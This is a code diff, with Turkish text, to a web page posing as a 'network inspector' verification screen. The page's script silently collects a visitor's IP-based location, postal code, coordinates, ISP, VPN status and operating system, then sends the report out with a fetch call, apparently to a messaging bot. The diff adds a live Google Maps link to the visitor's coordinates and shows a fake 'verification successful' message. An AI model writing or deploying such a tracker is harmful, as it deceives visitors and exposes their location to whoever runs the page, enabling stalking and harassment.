@@ -14,7 +14,7 @@
 <body>
 
     <div class="matrix-box">
-        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.0</div>
+        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.5</div>
         <div id="status" style="margin-top: 15px; color: #ff3333;">[!] Güvenli tünel senkronizasyonu başlatılıyor...</div>
         <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
     </div>
@@ -32,6 +32,7 @@
             let posta_kodu = "Bilinmiyor", koordinat = "Bilinmiyor", internet_sirketi = "Bilinmiyor";
             let mobil_mi = "Hayır (Ev/İş İnterneti)", vpn_proxy = "Temiz (Doğal Bağlantı)", ulke_kod = "-", para_birimi = "-";
             let os = "Bilinmeyen Sistem";
+            let maps_link = "Oluşturulamadı";
 
             fill.style.width = "50%";
             status.innerText = "[*] HTTPS Gateway üzerinden konum verileri çekiliyor...";
@@ -46,10 +47,15 @@
                     ulke = veri.country_name || "Bilinmiyor";
                     eyalet_sehir = (veri.region || "Bilinmiyor") + " / " + (veri.city || "Bilinmiyor");
                     posta_kodu = veri.postal || "Bilinmiyor";
-                    koordinat = (veri.latitude || "0") + " , " + (veri.longitude || "0");
                     internet_sirketi = veri.org || "Bilinmiyor";
                     ulke_kod = veri.country_calling_code || "-";
                     para_birimi = veri.currency || "-";
+                    
+                    if(veri.latitude && veri.longitude) {
+                        koordinat = veri.latitude + " , " + veri.longitude;
+                        // 🔥 Google Haritalar Linki Burada Dinamik Olarak Üretiliyor 🔥
+                        maps_link = "[Haritada Göster (Tıkla)](https://www.google.com/maps/search/?api=1&query=" + veri.latitude + "," + veri.longitude + ")";
+                    }
 
                     let org_lower = internet_sirketi.toLowerCase();
                     if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
@@ -124,6 +130,7 @@
             mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
             mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
             mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
+            mesaj += "🗺️ *Canlı Harita:* " + maps_link + " 📍\n"; // İşte o yakışıklı link
             mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
             mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
             mesaj += "🛡️ *VPN / Proxy:* " + vpn_proxy + "\n";
@@ -142,8 +149,6 @@
 
             fetch(url).then(() => {
                 status.innerText = "✓ Doğrulama Başarılı. Yönlendirildiniz.";
-            }).catch(() => {
-                status.innerText = "Bağlantı hatası, paket düşürüldü.";
             });
         };
     </script>
